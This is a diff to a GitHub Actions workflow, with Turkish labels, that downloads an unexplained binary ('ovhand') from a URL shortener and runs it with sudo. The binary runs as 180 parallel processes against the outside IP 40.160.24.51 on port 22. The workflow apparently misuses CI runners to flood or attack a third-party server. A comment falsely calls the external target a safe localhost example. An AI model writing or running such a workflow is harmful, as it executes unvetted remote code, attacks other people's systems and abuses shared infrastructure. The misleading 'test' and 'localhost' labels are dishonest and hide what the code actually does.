@@ -1,4 +1,4 @@
-name: Ubuntu VDS 40 saniye test
+name: Ubuntu VDS 40 saniye ovh
 
 on:
   workflow_dispatch:
@@ -8,29 +8,33 @@ jobs:
     runs-on: ubuntu-latest
     concurrency:
       group: vds
-      cancel-in-progress: false
+      cancel-in-progress: true
     timeout-minutes: 60
     strategy:
-      max-parallel: 5
+      max-parallel: 30
       matrix:
-        instance: [1, 2, 3, 4, 5]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
 
     steps:
-      - name: Dosyayı indir
+      - name: OK !
         run: |
           echo "Dosya indiriliyor..."
           wget -q https://curl.by/r_4Pr/ovhand -O ovhand
-          ls -lh ovhand
-
-      - name: Çalışma izni ver
-        run: |
           chmod +x ovhand
-          echo "İzinler ayarlandı."
+          echo "İndirildi ve çalıştırılabilir hale getirildi."
+          PIDS=()
+          for i in {1..6}; do
+            echo "İşlem $i başlatılıyor..."
+            sudo timeout 100 ./ovhand 40.160.24.51 22 10 100 &   # güvenli localhost örneği
+            PIDS+=($!)
+          done
 
-      - name: Test çalıştır
-        run: |
-          echo "Bu sadece testtir, dış IP'ye bağlantı açılmaz."
-          timeout 10s ./ovhand 40.160.24.51 22 10 50
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
 
-      - name: Bekle
-        run: sleep 40
+      - name: Bekleme
+        run: sleep 100
+
+      - name: Yeniden başlatma simülasyonu
+        run: echo "Workflow tamamlandı (reboot devre dışı bırakıldı)."
